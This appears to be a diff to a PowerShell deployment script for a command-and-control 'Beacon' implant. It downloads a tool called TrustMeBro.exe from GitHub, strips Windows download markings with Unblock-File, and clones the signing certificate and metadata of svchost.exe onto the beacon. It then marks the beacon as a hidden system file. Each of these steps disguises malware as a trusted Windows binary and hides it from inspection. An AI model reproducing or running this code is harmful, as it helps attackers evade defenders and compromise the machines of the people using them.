@@ -117,8 +117,13 @@ if (-not (Test-Path $BeaconPath)) {
     Invoke-WebRequest -Uri "https://github.com/KriyosArcane/TrustMeBro/raw/refs/heads/main/TrustMeBro.exe" -OutFile "$TempDir\TrustMeBro.exe" -UseBasicParsing -ErrorAction SilentlyContinue
     
     if ((Test-Path $BeaconPath) -and (Test-Path "$TempDir\TrustMeBro.exe")) {
+        Write-Host "    -> Unblocking downloaded files..."
+        Unblock-File -Path $BeaconPath -ErrorAction SilentlyContinue
+        Unblock-File -Path "$TempDir\TrustMeBro.exe" -ErrorAction SilentlyContinue
+        
         Write-Host "    -> Cloning Certificate and Metadata using TrustMeBro..."
-        Start-Process -FilePath "$TempDir\TrustMeBro.exe" -ArgumentList "--clone C:\Windows\System32\RuntimeBroker.exe `"$BeaconPath`"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
+        # We use svchost.exe as the source because RuntimeBroker.exe often fails LoadLibraryEx due to UWP permissions/MUI resource separation.
+        Start-Process -FilePath "$TempDir\TrustMeBro.exe" -ArgumentList "--clone C:\Windows\System32\svchost.exe `"$BeaconPath`"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
         
         Write-Host "    -> Setting Hidden and System attributes on Beacon..."
         Set-ItemProperty -Path $BeaconPath -Name Attributes -Value "Hidden, System" -ErrorAction SilentlyContinue
